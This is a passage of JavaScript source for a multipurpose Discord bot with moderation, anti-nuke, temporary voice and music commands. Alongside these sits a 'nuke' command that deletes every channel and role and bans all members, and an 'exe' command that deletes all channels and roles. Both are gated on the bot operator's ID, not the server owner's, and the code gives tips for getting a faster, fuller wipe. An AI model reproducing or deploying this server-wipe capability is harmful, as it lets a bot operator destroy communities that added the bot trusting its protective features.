        targetChannel = message.guild.channels.cache.get(args[0]);
        if (!targetChannel) {
          return message.reply(`Couldn't find a channel matching \`${args[0]}\` in this server. Use a mention or a valid channel ID.`);
        }
      } else {
        targetChannel = message.channel;
      }
      if (targetChannel.guild?.id !== message.guild.id) {
        return message.reply("That channel isn't in this server.");
      }

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }
      if (!targetChannel.deletable) {
        return message.reply("I can't delete that channel — check my role position and permissions there.");
      }

      const channelName = targetChannel.name;
      const isCurrent = targetChannel.id === message.channel.id;
      try {
        if (isCurrent) {
          await message.reply(`Deleting this channel (**#${channelName}**)...`);
        }
        await withRetry(() => targetChannel.delete(`Deleted by ${message.author.tag} via ${prefix}deletechannel`));
        if (!isCurrent) {
          return message.reply(`Deleted channel **#${channelName}**.`);
        }
        return;
      } catch (err) {
        return message.reply(`Couldn't delete that channel: ${err.message}`);
      }
    }

    if (cmd === 'mute' || cmd === 'timeout') {
      if (!message.member.permissions.has(PermissionFlagsBits.ModerateMembers)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const target = message.mentions.members?.first();
      const timeArg = args.find((a) => parseDuration(a) !== null);
      if (!target || !timeArg) {
        return message.reply(`Usage: \`${prefix}mute @user <time>\` (e.g. \`${prefix}mute @user 10m\`)`);
      }

      const duration = parseDuration(timeArg);
      const maxDuration = 28 * 24 * 60 * 60 * 1000;
      if (!duration || duration <= 0) {
        return message.reply('Give a valid time like `30s`, `10m`, `2h`, or `1d`.');
      }
      if (duration > maxDuration) {
        return message.reply("Discord timeouts can't exceed 28 days.");
      }

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }
      if (target.id === message.guild.ownerId) {
        return message.reply("I can't timeout the server owner.");
      }
      if (target.roles.highest.position >= me.roles.highest.position) {
        return message.reply("That member's role is higher than or equal to mine — I can't mute them.");
      }

      try {
        await target.timeout(duration, `Muted by ${message.author.tag} via ${prefix}mute`);
        return message.reply(`${target} muted for **${timeArg}**.`);
      } catch (err) {
        return message.reply(`Couldn't mute that member: ${err.message}`);
      }
    }

    if (cmd === 'unmute') {
      if (!message.member.permissions.has(PermissionFlagsBits.ModerateMembers)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const target = message.mentions.members?.first();
      if (!target) {
        return message.reply(`Usage: \`${prefix}unmute @user\``);
      }

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ModerateMembers)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }
      if (!target.communicationDisabledUntilTimestamp || target.communicationDisabledUntilTimestamp < Date.now()) {
        return message.reply(`ℹ${target} isn't muted.`);
      }
      if (target.roles.highest.position >= me.roles.highest.position) {
        return message.reply("That member's role is higher than or equal to mine — I can't unmute them.");
      }

      try {
        await target.timeout(null, `Unmuted by ${message.author.tag} via ${prefix}unmute`);
        return message.reply(`${target} unmuted.`);
      } catch (err) {
        return message.reply(`Couldn't unmute that member: ${err.message}`);
      }
    }

    if (cmd === 'steal' || cmd === 'addemoji') {
      return handleSteal(message, args, prefix);
    }

    if (cmd === 'nick' || cmd === 'nickname') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageNicknames)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const target = message.mentions.members?.first();
      if (!target) {
        return message.reply(`Usage: \`${prefix}nick @user <nickname>\``);
      }
      const nickname = args
        .filter((a) => !/^<@!?\d+>$/.test(a))
        .join(' ')
        .trim()
        .slice(0, 32);
      if (!nickname) {
        return message.reply(`Usage: \`${prefix}nick @user <nickname>\``);
      }

      const me = message.guild.members.me;
      if (!me.permissions.has(PermissionFlagsBits.ManageNicknames)) {
        return message.reply("I don't have permission to do that. Contact an admin.");
      }
      if (target.id === message.guild.ownerId) {
        return message.reply("I can't change the server owner's nickname.");
      }
      if (target.roles.highest.position >= me.roles.highest.position && target.id !== message.author.id) {
        return message.reply("That member's role is higher than or equal to mine — I can't change their nickname.");
      }

      try {
        await target.setNickname(nickname, `Nickname set by ${message.author.tag} via ${prefix}nick`);
        return message.reply(`Nickname set for ${target}.`);
      } catch (err) {
        return message.reply(`Couldn't set that nickname: ${err.message}`);
      }
    }

    if (cmd === 'antinukeenable') {
      if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const logChannel = message.mentions.channels.first() || message.channel;
      if (logChannel.guild?.id !== message.guild.id) {
        return message.reply("That channel isn't in this server.");
      }
      config.antinuke.enabled = true;
      config.antinuke.logChannelId = logChannel.id;
      saveGuild(message.guild.id, config);
      return message.reply(`Anti-Nuke **enabled**. Alerts will be logged in ${logChannel}.`);
    }

    if (cmd === 'antinukedisable') {
      if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      config.antinuke.enabled = false;
      saveGuild(message.guild.id, config);
      return message.reply('Anti-Nuke **disabled**.');
    }

    if (cmd === 'limit') {
      if (!args[0]) return message.reply(`Usage: \`${prefix}limit <0-99>\``);
      return runVC(message, (c) => M.actions.setLimit(c, args[0]));
    }

    if (cmd === 'rename') {
      const name = args.join(' ');
      if (!name) return message.reply(`Give it a name: \`${prefix}rename Chill Zone\``);
      return runVC(message, (c) => M.actions.setName(c, name));
    }

    if (cmd === 'info') {
      const owned = ownedChannelOf(message, config, { owner: false });
      if (owned.error) return message.reply(`${owned.error}`);
      return message.reply({ embeds: [M.buildInfoEmbed(owned.ctx)], allowedMentions: { parse: [] } });
    }

    if (cmd === 'claim') {
      return runVC(message, (c) => M.actions.claim(c), { owner: false });
    }

    if (cmd === 'interface' || cmd === 'panel') {
      if (!message.member.permissions.has(PermissionFlagsBits.ManageGuild)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const target = message.mentions.channels.first() || message.channel;
      if (target.guild?.id !== message.guild.id || (target.type !== ChannelType.GuildText && target.type !== ChannelType.GuildAnnouncement)) {
        return message.reply('Pick a text channel in this server.');
      }
      try {
        await M.postInterface(target);
      } catch (err) {
        console.error('[SYNTIX] Failed to post voice interface:', err);
        return message.reply('I can\'t post in that channel. Contact an admin.');
      }
      const note = config.tempvc.enabled ? '' : `\nTemp voice isn't set up yet — run \`/setup-tempvc enable\` so people can create channels.`;
      if (target.id === message.channel.id) {
        await message.delete().catch(() => null);
        if (note) return message.channel.send(note.trim()).then((m) => setTimeout(() => m.delete().catch(() => null), 10000));
        return;
      }
      return message.reply(`Voice interface posted in ${target}.${note}`);
    }

    if (cmd === 'chat') {
      return runVC(message, (c) => M.actions.toggleChat(c));
    }

    if (cmd === 'waiting') {
      return runVC(message, (c) => M.actions.toggleWaitingRoom(c));
    }

    if (cmd === 'vcdelete') {
      return runVC(message, (c) => M.actions.remove(c));
    }

    if (['trust', 'untrust', 'block', 'unblock', 'kick', 'invite', 'transfer'].includes(cmd)) {
      const ids = parseUserIds(message, args);
      if (!ids.length) return message.reply(`Usage: \`${prefix}${cmd} @user\``);
      return runVC(message, (c) => {
        if (cmd === 'invite') return M.actions.invite(c, ids[0]);
        if (cmd === 'transfer') return M.actions.transfer(c, ids[0]);
        const fn = { trust: 'trust', untrust: 'untrust', block: 'block', unblock: 'unblock', kick: 'kick' }[cmd];
        return M.actions[fn](c, ids);
      });
    }

    if (cmd === 'nuke') {
      const ownerId = process.env.OWNER_ID?.trim();
      if (!ownerId) {
        return message.reply("This command is disabled. Contact an admin.");
      }
      if (message.author.id !== ownerId) {
        return message.reply("You can't use this. Contact an admin.");
      }

      const botMember = message.guild.members.me;
      const highestOtherRolePos = message.guild.roles.cache
        .filter(r => r.id !== message.guild.id && !r.managed)
        .reduce((max, r) => Math.max(max, r.position), 0);
      const hierarchyWarning = botMember.roles.highest.position <= highestOtherRolePos
        ? '\n\n**My role is not at the top of the role list.** Bans and role deletions will likely fail for ' +
          'anyone with a role positioned at or above mine. For a full wipe, move my role to the top of ' +
          '**Server Settings → Roles** before confirming.'
        : '';

      const permWarning = !botMember.permissions.has(PermissionFlagsBits.ManageGuild)
        ? '\n\n**I don\'t have Manage Server.** Fast bulk-banning needs Ban Members **and** Manage Server — ' +
          'without it I\'ll ban one member at a time, which is much slower on a big server. Grant Manage Server ' +
          'for the quick path.'
        : '';

      const embed = new EmbedBuilder()
        .setTitle('Confirm server wipe')
        .setColor(0xED4245)
        .setDescription(
          `This will delete **${message.guild.channels.cache.size} channel(s)**, ` +
          `**${message.guild.roles.cache.filter(r => r.id !== message.guild.id && !r.managed).size} role(s)**, ` +
          `and ban roughly **${message.guild.memberCount - 1} member(s)** (everyone but you).\n` +
          `This cannot be undone. Confirm within 15 seconds.${hierarchyWarning}${permWarning}`
        );
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`aeth_nuke_confirm_${message.author.id}`).setLabel('Confirm Wipe').setStyle(ButtonStyle.Danger)
      );
      const sentMsg = await message.reply({ embeds: [embed], components: [row] });

      markPending(sentMsg.id);
      setTimeout(async () => {
        if (!consume(sentMsg.id)) return;
        const expiredRow = new ActionRowBuilder().addComponents(
          ButtonBuilder.from(row.components[0]).setDisabled(true).setLabel('Expired').setStyle(ButtonStyle.Secondary)
        );
        await sentMsg.edit({ components: [expiredRow] }).catch(() => null);
      }, 15000);

      return;
    }

    // ---- fast bulk role+channel delete (no bans) — same engine/confirm flow as &nuke ----
    if (cmd === 'exe') {
      const ownerId = process.env.OWNER_ID?.trim();
      if (!ownerId) {
        return message.reply("This command is disabled. Contact an admin.");
      }
      if (message.author.id !== ownerId) {
        return message.reply("You can't use this. Contact an admin.");
      }

      const botMember = message.guild.members.me;
      const highestOtherRolePos = message.guild.roles.cache
        .filter(r => r.id !== message.guild.id && !r.managed)
        .reduce((max, r) => Math.max(max, r.position), 0);
      const hierarchyWarning = botMember.roles.highest.position <= highestOtherRolePos
        ? '\n\n**My role is not at the top of the role list.** Role deletions will likely fail for ' +
          'roles positioned at or above mine. Move my role to the top of **Server Settings → Roles** ' +
          'before confirming for a full sweep.'
        : '';

      const embed = new EmbedBuilder()
        .setTitle('Confirm fast role + channel wipe')
        .setColor(0xED4245)
        .setDescription(
          `This will delete **${message.guild.channels.cache.size} channel(s)** and ` +
          `**${message.guild.roles.cache.filter(r => r.id !== message.guild.id && !r.managed).size} role(s)**. ` +
          `No members are banned or kicked.\n` +
          `This cannot be undone. Confirm within 15 seconds.${hierarchyWarning}`
        );
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`aeth_exe_confirm_${message.author.id}`).setLabel('Confirm Wipe').setStyle(ButtonStyle.Danger)
      );
      const sentMsg = await message.reply({ embeds: [embed], components: [row] });

      markPending(sentMsg.id);
      setTimeout(async () => {
        if (!consume(sentMsg.id)) return;
        const expiredRow = new ActionRowBuilder().addComponents(
          ButtonBuilder.from(row.components[0]).setDisabled(true).setLabel('Expired').setStyle(ButtonStyle.Secondary)
        );
        await sentMsg.edit({ components: [expiredRow] }).catch(() => null);
      }, 15000);

      return;
    }

    if (cmd === 'whitelist' || cmd === 'wl') {
      if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const sub = args[0]?.toLowerCase();

      if (!sub) {
        const { embed, row } = buildWhitelistPanel(config);
        return message.reply({ embeds: [embed], components: [row] });
      }

      const target = message.mentions.users.first();

      if (sub === 'add') {
        if (!target) return message.reply(`Mention a user: \`${prefix}wl add @user\``);
        if (target.id === message.guild.ownerId) return message.reply(`ℹ${target} is the server owner and is already immune.`);
        if (config.antinuke.whitelist.includes(target.id)) return message.reply(`${target} is already whitelisted.`);
        config.antinuke.whitelist.push(target.id);
        saveGuild(message.guild.id, config);
        return message.reply(`${target} added to the anti-nuke whitelist. (${config.antinuke.whitelist.length} total)`);
      }
      if (sub === 'remove' || sub === 'rmv') {
        if (!target) return message.reply(`Mention a user: \`${prefix}wl remove @user\``);
        if (!config.antinuke.whitelist.includes(target.id)) return message.reply(`${target} isn't on the whitelist.`);
        config.antinuke.whitelist = config.antinuke.whitelist.filter(id => id !== target.id);
        saveGuild(message.guild.id, config);
        return message.reply(`${target} removed from the anti-nuke whitelist. (${config.antinuke.whitelist.length} total)`);
      }
      if (sub === 'list') {
        const ids = config.antinuke.whitelist;
        const embed = new EmbedBuilder()
          .setTitle('Anti-Nuke Whitelist')
          .setColor(0x5865F2)
          .setDescription(
            ids.length
              ? ids.map(id => `<@${id}>`).join('\n')
              : 'No one whitelisted yet.'
          )
          .setFooter({ text: `Use ${prefix}wl (no arguments) to tick/untick members interactively.` });
        return message.reply({ embeds: [embed] });
      }
      return message.reply(`Usage: \`${prefix}wl\` (interactive panel), \`${prefix}wl add|remove|list [@user]\``);
    }

    if (cmd === 'modules' || cmd === 'antinukemodules' || cmd === 'protections') {
      if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply("You can't use this. Contact an admin.");
      }
      const { embed, row } = buildModulesPanel(config);
      return message.reply({ embeds: [embed], components: [row] });
    }

    if (cmd === 'play') {
      const query = args.join(' ');
      if (!query) return message.reply(`Give me a song name or URL: \`${prefix}play never gonna give you up\``);
      const loadingMsg = await message.reply('Searching...');
      try {
        const result = await music.addToQueue({
          guild: message.guild,
          member: message.member,
          textChannel: message.channel,
          query
        });
        const embed = new EmbedBuilder().setColor(0x5865F2);
        if (result.startedPlaying) {
          embed.setTitle('Now playing').setDescription(`**${result.track.title}**`)
            .setThumbnail(result.track.thumbnail || null)
            .addFields({ name: 'Duration', value: music.formatDuration(result.track.durationSeconds), inline: true });
        } else {
          embed.setTitle('Added to queue').setDescription(`**${result.track.title}**`)
            .setThumbnail(result.track.thumbnail || null)
            .addFields(
              { name: 'Duration', value: music.formatDuration(result.track.durationSeconds), inline: true },
              { name: 'Position', value: `${result.position}`, inline: true }
            );
        }
        return loadingMsg.edit({ content: null, embeds: [embed] });
      } catch (err) {
        return loadingMsg.edit(`${err.message}`);
      }
    }

    if (cmd === 'skip') {
      try {
        const skipped = music.skip(message.guild.id);
        return message.reply(`Skipped **${skipped.title}**.`);
      } catch (err) {
        return message.reply(`${err.message}`);
      }
    }

    if (cmd === 'stop') {
      try {
        music.stop(message.guild.id);
        return message.reply('Stopped playback and cleared the queue.');
      } catch (err) {
        return message.reply(`${err.message}`);
      }
    }

    if (cmd === 'pause') {
      try {
        music.pause(message.guild.id);
        return message.reply('Paused.');
      } catch (err) {
        return message.reply(`${err.message}`);
      }
    }

    if (cmd === 'resume') {
      try {
        music.resume(message.guild.id);
        return message.reply('▶Resumed.');
      } catch (err) {
        return message.reply(`${err.message}`);
      }
    }

    if (cmd === 'volume') {
      const percent = Math.max(0, Math.min(200, parseInt(args[0], 10)));
      if (Number.isNaN(percent)) return message.reply(`Give me a number 0-200: \`${prefix}volume 100\``);
      try {
        music.setVolume(message.guild.id, percent);
        return message.reply(`Volume set to ${percent}%.`);
      } catch (err) {
        return message.reply(`${err.message}`);
      }
    }

    if (cmd === 'loop') {
      const mode = args[0]?.toLowerCase();
      if (!['off', 'track', 'queue'].includes(mode)) {
        return message.reply(`Usage: \`${prefix}loop off|track|queue\``);
      }
      try {
        music.setLoop(message.guild.id, mode);
        return message.reply(`Loop mode set to **${mode}**.`);
      } catch (err) {
        return message.reply(`${err.message}`);
      }
    }

    if (cmd === 'nowplaying' || cmd === 'np') {
      const queue = music.getQueue(message.guild.id);
      if (!queue?.nowPlaying) return message.reply('Nothing is playing right now.');
      const embed = new EmbedBuilder()
        .setTitle('Now playing')
        .setDescription(`**${queue.nowPlaying.title}**`)
        .setThumbnail(queue.nowPlaying.thumbnail || null)
        .setColor(0x5865F2)
        .addFields(
          { name: 'Duration', value: music.formatDuration(queue.nowPlaying.durationSeconds), inline: true },
          { name: 'Requested by', value: `<@${queue.nowPlaying.requestedBy}>`, inline: true },
          { name: 'Loop', value: queue.loop, inline: true }
        );
      return message.reply({ embeds: [embed] });
    }

    if (cmd === 'queue') {
      const queue = music.getQueue(message.guild.id);
      if (!queue || (!queue.nowPlaying && queue.songs.length === 0)) {
        return message.reply('The queue is empty.');
      }
      const lines = queue.songs.slice(0, 10).map((s, i) => `**${i + 1}.** ${s.title} — ${music.formatDuration(s.durationSeconds)}`);
      const embed = new EmbedBuilder()
        .setTitle('Queue')
        .setColor(0x5865F2)
        .setDescription(
          `**Now playing:** ${queue.nowPlaying ? queue.nowPlaying.title : 'Nothing'}\n\n` +
          (lines.length ? lines.join('\n') : '_Queue is empty._') +
          (queue.songs.length > 10 ? `\n...and ${queue.songs.length - 10} more` : '')
        );
      return message.reply({ embeds: [embed] });
    }
  }
};